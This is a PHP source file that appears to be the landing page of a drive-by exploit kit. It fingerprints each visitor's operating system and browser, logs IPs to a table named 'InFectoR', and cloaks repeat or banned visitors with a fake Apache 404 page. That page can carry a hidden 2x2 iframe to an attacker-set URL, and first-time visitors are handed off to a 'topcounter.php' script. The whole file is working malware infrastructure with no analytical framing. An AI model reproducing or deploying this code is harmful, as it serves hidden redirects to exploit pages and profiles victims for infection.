<?
include "AdM/inc/logs/mode.php";
include "AdM/inc/config.php";
include "inc/sess.php";
mysql_connect($db_host, $db_user, $db_pass) or die("Couldn't connect to db!");
mysql_select_db($db_name) or die("DB \"$db_name\" not found!");

$reff = ''; //getenv("HTTP_REFERER");
$agent = getenv("HTTP_USER_AGENT");
$accept_lang = getenv("HTTP_ACCEPT_LANGUAGE");
$data=date("d-m-Y");
$time=date("H:i:s");

$dat_file="AdM/inc/logs/traff.db"; 
$log_file="AdM/inc/logs/traff.log";
$ie_dat_file="AdM/inc/logs/ie.db";


if ($_SERVER['HTTP_X_CLIENT_IP']) {
 $ip = $_SERVER['HTTP_X_CLIENT_IP'];
} else {
 $ip = getenv("REMOTE_ADDR");
}


if($_COOKIE['PHPSESS']){
   $fp = fopen ("AdM/inc/logs/red.php", "r");
   $read = fgets($fp, 1000);
   list($rn,$r_uri) = split('#',$read);
   fclose($fp);
   
   if ($rn == '1') {
    $fake = "<HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>Not Found</H1>The requested was not found on this server.<P><P>Additionally, a 404 Not Found error was encountered <iframe width=2 height=2 border=0 frameborder=0 src='".$r_uri."'></iframe>while trying to use an ErrorDocument to handle the request.<HR><ADDRESS>Apache/1.3.35</ADDRESS></BODY></HTML>";
   } else {
    $fake = "<HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>Not Found</H1>The requested was not found on this server.<P><P>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.<HR><ADDRESS>Apache/1.3.35</ADDRESS></BODY></HTML>";
   }
   print $fake;
   exit();
} else {
  setcookie('PHPSESS','eb495762ceafc9db6ecd72e689acc636',time()+86400);

if (strstr($agent, "SV1")) $os = "Windows XP SP2";
  elseif (strstr($agent, "Windows NT 5.1")) $os = "Windows XP";
  elseif (strstr($agent, "Windows NT 5.0")) $os = "Windows 2000";
  elseif (strstr($agent, "Windows 98")) $os = "Windows 98";
  elseif (strstr($agent, "Windows NT 5.2")) $os = "Windows 2003";
  elseif ((strstr($agent, "Win 9x 4.9")) || (strstr($agent, "Windows Me"))) $os = "Windows ME";
  elseif (strstr($agent, "Windows NT 4")) $os = "Windows NT";
  elseif (strstr($agent, "Windows 95")) $os = "Windows 95";
else   $os = "Not Windows";

if (strstr($agent, "MSIE")) $browser = "MSIE";
  elseif (strstr($agent, "Firefox")) $browser = "Firefox";
  elseif (strstr($agent, "Opera")) $browser = "Opera";
  elseif ((strstr($agent, "Netscape")) || (strstr($agent, "Nav"))) $browser = "Netscape";
  elseif (strstr($agent, "Lynx")) $browser = "Lynx";
  elseif (strstr($agent, "Konqueror")) $browser = "Konqueror";
  elseif (strstr($agent, "MyIE2")) $browser = "MyIE2";
  elseif (strstr($agent, "Maxthon")) $browser = "Maxthon";
  elseif (strstr($agent, "Avant Browser")) $browser = "Avant Browser";
  elseif (strstr($agent, "WebTV")) $browser = "WebTV";
  elseif (strstr($agent, "Bot")) $browser = "Bot";
  elseif (strstr($agent, "Wget")) $browser = "Wget";
  elseif (strstr($agent, "EmailSiphon")) $browser = "EmailSiphon";
  elseif (strstr($agent, "WebZIP")) $browser = "MSProxy/2.0";
  elseif (strstr($agent, "EmailWolf")) $browser = "EmailWolf";
  elseif (strstr($agent, "webbandit")) $browser = "Webbandit";
  elseif (strstr($agent, "MS FrontPage")) $browser = "MS FrontPage";
  elseif (strstr($agent, "Galeon")) $browser = "Galeon";
  elseif (strstr($agent, "Crazy Browser")) $browser = "Crazy Browser";
  elseif (strstr($agent, "Netcaptor")) $browser = "Netcaptor";
  elseif (strstr($agent, "Deepnet")) $browser = "Deepnet Explorer";
  elseif (strstr($agent, "EuripBot")) $browser = "EuripBot";
  elseif (strstr($agent, "Exabot")) $browser = "Exabot";
  elseif (strstr($agent, "WebCrawler")) $browser = "FAST";
  elseif (strstr($agent, "GalaxyBot")) $browser = "Galaxy";
  elseif (strstr($agent, "Galeon")) $browser = "Galeon";
  elseif (strstr($agent, "GreenBrowser")) $browser = "GreenBrowser";
  elseif (strstr($agent, "IBrowse")) $browser = "IBrowse";
else   $browser = "Other";

 if ($mode == 'SQL'){
 
    $sf = mysql_query("select ban from SettIngS");
    $timeout = mysql_fetch_array($sf);

    $Ds = SQL('SELECT * FROM StaTs WHERE ip = ? AND date > ?', $ip, date("Y-m-d H:i:s", time() - $timeout["ban"]));
    $rs = mysql_query($Ds);
    $ban = mysql_num_rows($rs);

      if ($ban > 0) { mysql_query('UPDATE InFectoR set tot_ban = tot_ban + 1');
	  
	     $fp = fopen ("AdM/inc/logs/red.php", "r");
         $read = fgets($fp, 1000);
         list($rn,$r_uri) = split('#',$read);
         fclose($fp);
			
	     if ($rn == '1') {
           $fake = "<HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>Not Found</H1>The requested was not found on this server.<P><P>Additionally, a 404 Not Found error was encountered <iframe width=2 height=2 border=0 frameborder=0 src='".$r_uri."'></iframe>while trying to use an ErrorDocument to handle the request.<HR><ADDRESS>Apache/1.3.35</ADDRESS></BODY></HTML>";
         } else {
           $fake = "<HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>Not Found</H1>The requested was not found on this server.<P><P>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.<HR><ADDRESS>Apache/1.3.35</ADDRESS></BODY></HTML>";
         }
		 
        print $fake;
        exit();
      }

   $sql = SQL('INSERT INTO StaTs (date, ip, agent, browser, os, referer, lang) VALUES(?, ?, ?, ?, ?, ?, ?)', date("Y-m-d H:i:s"), $ip, $agent, $browser, $os, $reff, $accept_lang);
   mysql_query($sql);
   
} else if ($mode == 'TEXT') {

    $f=fopen($dat_file,"r");
    $count=fgets($f,100);
    fclose($f);
    $count=ereg_replace("\n","",$count);
    $count++; 
    $f=fopen($dat_file,"w");
    fputs($f,"$count");
    fclose($f);

    $f=fopen($log_file,"a+");
    fputs($f,"$count#$data#$time#$ip#$browser#$os#\n");
    fclose($f);

      if ($browser == "MSIE"){
        $f=fopen($ie_dat_file,"r");
        $count=fgets($f,100);
        fclose($f);
        $count=ereg_replace("\n","",$count);
        $count++; 
        $f=fopen($ie_dat_file,"w");
        fputs($f,"$count");
        fclose($f);
    }
} else if ($mode == 'EASY') {

    $f=fopen($dat_file,"r");
    $count=fgets($f,100);
    fclose($f);
    $count=ereg_replace("\n","",$count);
    $count++; 
    $f=fopen($dat_file,"w");
    fputs($f,"$count");
    fclose($f);

      if ($browser == "MSIE"){
        $f=fopen($ie_dat_file,"r");
        $count=fgets($f,100);
        fclose($f);
        $count=ereg_replace("\n","",$count);
        $count++; 
        $f=fopen($ie_dat_file,"w");
        fputs($f,"$count");
        fclose($f);
    }

} else {}

print '<script language="javascript" src="topcounter.php"></script>';

}
?>